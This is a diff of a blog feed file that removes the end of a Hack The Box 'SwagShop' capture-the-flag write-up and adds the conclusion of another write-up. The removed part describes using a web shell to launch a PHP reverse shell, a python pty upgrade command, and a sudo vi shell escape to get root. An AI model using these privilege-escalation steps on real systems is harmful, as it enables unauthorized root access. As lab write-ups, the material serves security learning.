-&lt;p&gt;In order to exploit this we’re going to need a shell that allows us to use &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;. So, it’s time to get a reverse shell fired up. Since we’ve got a php reverse shell in our modified Magneto package already, we can launch it with our current web shell.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/launch_reverse.png&quot; alt=&quot;Lauch Revers.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Issuing the command &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; makes it fully interactive and able to run &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/netcat_rshell.png&quot; alt=&quot;NetCat rshell.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In order to launch a root shell, issue the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/vi /var/www/html/whatever.sh&lt;/code&gt;. This will run &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; as root, which we can do without a password if we’re working on a file in the web directory. Since &lt;a href=&quot;http://web.physics.ucsb.edu/~pcs/apps/editors/vi/vi_unix.html&quot;&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; is able to issue shell commands&lt;/em&gt;&lt;/a&gt; via the &lt;code class=&quot;highlighter-rouge&quot;&gt;:!&lt;/code&gt;, we can use this to launch bash as root.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/rooted.png&quot; alt=&quot;rooted.&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;I really enjoyed working on SwagShop. Some have complained that the public exploit used to gain the initial foothold was a few years too old, which I think is valid. The box did seem realistic to me though because I’m aware of plenty of small businesses who have no one maintaining their applications once they’re built. Unless/until there’s an issue they just leave their sites up and running unpatched. The fact that there could be an outdated version of Magneto from years ago isn’t that far out there. Privilege escalation on this box was really simple if you’re aware the &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; can execute commands. Personally I’d never done that before, but a quick Google search made me aware and root was gained. There were a few rabbit holes such as the &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions&lt;/code&gt; tempting us to try and use hijacking, and the MySQL credentials never turned out to be very necessary.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Magneto" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Writeup was a quick and easy box. The initial exploit for the CMS was really fun to watch run, as others have said it felt like The Matrix. After that, the privilege escalation had me a little stumped until I heard about pyspy, then it was fairly easy since the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable stuck out like a soar thumb. It was still fun to figure out how to exploit that after discovery though, and getting the root shell was rather satisfying.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="CMS Made Simple" /><summary type="html"></summary></entry></feed>
